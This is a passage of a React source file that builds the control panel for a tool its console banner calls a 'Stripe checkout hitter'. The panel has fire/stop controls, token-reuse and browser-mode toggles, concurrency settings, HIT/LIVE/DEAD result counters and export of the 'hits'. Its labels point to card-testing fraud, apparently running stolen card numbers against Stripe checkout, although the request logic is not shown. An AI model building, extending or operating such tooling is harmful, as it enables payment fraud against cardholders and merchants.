                  className="w-full h-1 bg-cyan-500/20 appearance-none cursor-pointer [&::-webkit-slider-thumb]:appearance-none [&::-webkit-slider-thumb]:w-3 [&::-webkit-slider-thumb]:h-3 [&::-webkit-slider-thumb]:bg-cyan-400 [&::-webkit-slider-thumb]:rounded-none"
                  disabled={isHitting} data-testid="slider-confirm-delay" />
                <div className="flex justify-between text-[9px] text-muted-foreground/50 font-mono"><span>0s</span><span>4s</span><span>8s</span></div>
              </div>

              {/* Toggles */}
              <div className="flex items-center justify-between border border-primary/10 p-3 bg-background/20">
                <span className="text-muted-foreground font-mono text-[10px] flex items-center gap-1"><Shield className="w-3 h-3" /> TOKEN REUSE</span>
                <button onClick={() => setTokenReuse(!tokenReuse)} disabled={isHitting}
                  className={`flex items-center gap-1 font-mono text-xs transition-colors ${tokenReuse ? "text-emerald-400" : "text-muted-foreground/50"}`}
                  data-testid="button-toggle-token-reuse">
                  {tokenReuse ? <><ToggleRight className="w-5 h-5" /> ON</> : <><ToggleLeft className="w-5 h-5" /> OFF</>}
                </button>
              </div>

              <div className="flex items-center justify-between border border-primary/10 p-3 bg-background/20">
                <span className="text-muted-foreground font-mono text-[10px] flex items-center gap-1"><Layers className="w-3 h-3" /> BROWSER MODE</span>
                <button onClick={() => setBrowserMode(p => p === "off" ? "auto" : p === "auto" ? "on" : "off")}
                  disabled={isHitting}
                  className={`flex items-center gap-1 font-mono text-xs transition-colors ${browserMode === "on" ? "text-purple-400" : browserMode === "auto" ? "text-cyan-400" : "text-muted-foreground/50"}`}
                  data-testid="button-toggle-browser-mode">
                  {browserMode === "on" ? <><ToggleRight className="w-5 h-5" /> ON</>
                   : browserMode === "auto" ? <><ToggleRight className="w-5 h-5" /> AUTO</>
                   : <><ToggleLeft className="w-5 h-5" /> OFF</>}
                </button>
              </div>

              {/* Fire / Stop */}
              <div className="flex gap-2">
                {!isHitting ? (
                  <Button onClick={handleHit} disabled={!sessionData || sessionLocked}
                    className={`flex-1 rounded-none font-display font-bold tracking-widest text-xs h-9 ${
                      sessionLocked
                        ? "bg-orange-500/10 text-orange-500/50 border border-orange-500/30 cursor-not-allowed"
                        : "bg-red-500/20 text-red-400 border border-red-500 hover:bg-red-500 hover:text-black"
                    }`} data-testid="button-hit">
                    {sessionLocked
                      ? <><Lock className="w-3 h-3 mr-2" /> SESSION LOCKED</>
                      : <><Zap className="w-3 h-3 mr-2" /> FIRE</>}
                  </Button>
                ) : (
                  <Button onClick={handleStop}
                    className="flex-1 rounded-none bg-destructive/20 text-destructive border border-destructive hover:bg-destructive hover:text-black font-display font-bold tracking-widest text-xs h-9"
                    data-testid="button-stop-hit">
                    <Square className="w-3 h-3 mr-2" /> STOP
                  </Button>
                )}
              </div>
            </CardContent>
          </Card>

          {/* Progress */}
          {progress.total > 0 && (
            <Card className="glass-panel rounded-none">
              <CardContent className="p-4 space-y-3">
                <div className="flex justify-between font-mono text-xs">
                  <span className="text-muted-foreground">Progress</span>
                  <div className="flex items-center gap-3">
                    <span className="text-primary tabular-nums">{progress.current}/{progress.total} ({pct}%)</span>
                    {eta && isHitting && (
                      <span className="text-cyan-400 flex items-center gap-1">
                        <Clock className="w-3 h-3" /> ETA {eta}
                      </span>
                    )}
                  </div>
                </div>
                <div className="w-full bg-primary/10 h-1.5 overflow-hidden">
                  <div className="bg-primary h-1.5 transition-all duration-300" style={{ width: `${pct}%` }} />
                </div>
                {avgLatency > 0 && (
                  <div className="flex justify-between font-mono text-[10px] text-muted-foreground/60">
                    <span>Avg: {avgLatency}ms</span>
                    <span>×{concurrency} {speedMode}</span>
                  </div>
                )}
                <div className="grid grid-cols-3 gap-2 text-center font-mono text-xs">
                  <div className="border border-emerald-500/20 bg-emerald-500/5 p-2">
                    <div className="text-emerald-400 font-bold text-lg tabular-nums">{progress.success}</div>
                    <div className="text-emerald-400/60 text-[10px]">HIT</div>
                  </div>
                  <div className="border border-red-500/20 bg-red-500/5 p-2">
                    <div className="text-red-400 font-bold text-lg tabular-nums">{progress.declined}</div>
                    <div className="text-red-400/60 text-[10px]">DEAD</div>
                  </div>
                  <div className="border border-yellow-500/20 bg-yellow-500/5 p-2">
                    <div className="text-yellow-400 font-bold text-lg tabular-nums">{progress.errors}</div>
                    <div className="text-yellow-400/60 text-[10px]">ERR</div>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Export */}
          {results.length > 0 && (
            <Card className="glass-panel rounded-none">
              <CardHeader className="border-b border-white/[0.06] pb-3">
                <CardTitle className="font-display tracking-widest text-sm flex items-center gap-2">
                  <Download className="w-4 h-4 text-primary" /> EXPORT
                </CardTitle>
              </CardHeader>
              <CardContent className="p-3 space-y-2">
                {successResults.length > 0 && (
                  <div className="flex gap-2">
                    <Button size="sm" onClick={() => copyResults("success")}
                      className="flex-1 rounded-none bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 hover:bg-emerald-500/20 font-mono text-[10px] h-7"
                      data-testid="button-copy-hits">
                      <Copy className="w-3 h-3 mr-1" /> HITS ({successResults.length})
                    </Button>
                    <Button size="sm" onClick={() => exportResults("success")}
                      className="rounded-none bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 hover:bg-emerald-500/20 font-mono text-[10px] h-7 px-2"
                      data-testid="button-export-hits">
                      <Download className="w-3 h-3" />
                    </Button>
                  </div>
                )}
                {liveResults.length > 0 && (
                  <div className="flex gap-2">
                    <Button size="sm" onClick={() => copyResults("live")}
                      className="flex-1 rounded-none bg-orange-500/10 text-orange-400 border border-orange-500/30 hover:bg-orange-500/20 font-mono text-[10px] h-7"
                      data-testid="button-copy-live">
                      <Copy className="w-3 h-3 mr-1" /> LIVE ({liveResults.length})
                    </Button>
                    <Button size="sm" onClick={() => exportResults("live")}
                      className="rounded-none bg-orange-500/10 text-orange-400 border border-orange-500/30 hover:bg-orange-500/20 font-mono text-[10px] h-7 px-2"
                      data-testid="button-export-live">
                      <Download className="w-3 h-3" />
                    </Button>
                  </div>
                )}
                <Button size="sm" onClick={() => exportResults("all")}
                  className="w-full rounded-none bg-primary/10 text-primary border border-primary/30 hover:bg-primary/20 font-mono text-[10px] h-7"
                  data-testid="button-export-all">
                  <Download className="w-3 h-3 mr-1" /> ALL ({results.length})
                </Button>
              </CardContent>
            </Card>
          )}
        </div>

        {/* ── Console ── */}
        <Card className="glass-panel rounded-none lg:col-span-2 flex flex-col">
          <CardHeader className="border-b border-white/[0.06] flex flex-row items-center justify-between py-3 shrink-0">
            <CardTitle className="font-display tracking-widest text-sm flex items-center gap-2">
              <Crosshair className="w-4 h-4 text-accent" /> HIT CONSOLE
            </CardTitle>
            <div className="flex items-center gap-2 font-mono text-xs">
              {successResults.length > 0 && <span className="text-emerald-400 font-bold">{successResults.length} hit</span>}
              {liveResults.length > 0    && <span className="text-orange-400 font-bold">{liveResults.length} live</span>}
              {sessionLocked             && <span className="text-orange-500 flex items-center gap-1"><Lock className="w-3 h-3" /> LOCKED</span>}
              <button onClick={() => setSoundEnabled(!soundEnabled)}
                className={`p-1 transition-colors ${soundEnabled ? "text-cyan-400" : "text-muted-foreground/40 hover:text-muted-foreground"}`}
                title={soundEnabled ? "Sound on" : "Sound off"} data-testid="button-toggle-sound">
                {soundEnabled ? <Volume2 className="w-3.5 h-3.5" /> : <VolumeX className="w-3.5 h-3.5" />}
              </button>
              <button onClick={() => setAutoScroll(!autoScroll)}
                className={`p-1 transition-colors ${autoScroll ? "text-cyan-400" : "text-muted-foreground/40 hover:text-muted-foreground"}`}
                title="Toggle auto-scroll" data-testid="button-toggle-autoscroll">
                <ArrowDownToLine className="w-3.5 h-3.5" />
              </button>
              {logs.length > 2 && (
                <button onClick={() => setLogs([
                    { html: `<span class="text-cyan-400">$$$ STRIPE CHECKOUT HITTER v3.0 $$$</span>`, type: "info" },
                    { html: `<span class="text-muted-foreground">Console cleared</span>`, type: "info" },
                  ])}
                  className="p-1 text-muted-foreground/30 hover:text-destructive transition-colors"
                  title="Clear console" data-testid="button-clear-console">
                  <Trash2 className="w-3.5 h-3.5" />
                </button>
              )}
            </div>
          </CardHeader>

          {/* Filter tabs */}
          <div className="flex border-b border-primary/10 bg-white/[0.02] shrink-0">
            {(["all", "hits", "live", "dead", "errors"] as ConsoleFilter[]).map(filter => (
              <button key={filter} onClick={() => setConsoleFilter(filter)}
                className={`flex-1 py-1.5 font-mono text-[10px] uppercase tracking-wider transition-colors border-b-2 ${
                  consoleFilter === filter
                    ? filter === "hits"   ? "border-emerald-400 text-emerald-400 bg-emerald-400/5"
                    : filter === "live"   ? "border-orange-400 text-orange-400 bg-orange-400/5"
                    : filter === "dead"   ? "border-red-400 text-red-400 bg-red-400/5"
                    : filter === "errors" ? "border-yellow-400 text-yellow-400 bg-yellow-400/5"
                                          : "border-primary text-primary bg-primary/5"
                    : "border-transparent text-muted-foreground/50 hover:text-muted-foreground hover:bg-primary/5"
                }`} data-testid={`button-filter-${filter}`}>
                {filter} {filterCounts[filter] > 0 && `(${filterCounts[filter]})`}
              </button>
            ))}
          </div>

          {/* Log output */}
          <CardContent className="p-0 flex-1">
            <div ref={consoleRef}
              className="h-[500px] lg:h-[600px] overflow-y-auto custom-scrollbar bg-black/40 p-4 font-mono text-[13px] space-y-0.5"
              data-testid="div-hit-console">
              {filteredLogs.length === 0 && consoleFilter !== "all" ? (
                <div className="text-muted-foreground/30 text-center pt-8 font-mono text-xs">
                  No {consoleFilter} entries yet
                </div>
              ) : (
                filteredLogs.map((log, i) => (
                  <div key={i}
                    className="leading-relaxed hover:bg-white/[0.03] px-1 -mx-1 cursor-default"
                    dangerouslySetInnerHTML={{ __html: log.html }}
                  />
                ))
              )}
              {isHitting && <div className="text-cyan-400 animate-pulse mt-1">_</div>}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
